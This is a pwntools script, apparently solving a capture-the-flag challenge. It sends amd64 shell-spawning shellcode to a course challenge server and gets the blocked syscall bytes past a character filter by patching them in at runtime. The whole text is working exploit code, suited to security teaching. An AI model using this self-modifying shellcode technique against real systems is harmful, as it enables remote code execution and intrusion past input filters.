'/ Shellcode with banned characters /'
from pwn import *
context(os='linux', arch='amd64')
r = remote('edu-ctf.csie.org', 10150)

modify1 = asm('add byte ptr[rdx+0x40], 1')
modify2 = asm('add byte ptr[rdx+0x41], 1')
lag = asm(shellcraft.nop())
code = asm(shellcraft.sh())

code = bytearray(code)[:-2] + b'\x0e\x04' + asm('ret')
num_lag = 0x40 - len(modify1) - len(modify2) - (len(code)-3)
assert num_lag >= 0
exploit = lag * num_lag + modify1 + modify2 + code

r.recvuntil('\n')
r.send(exploit)
r.interactive()

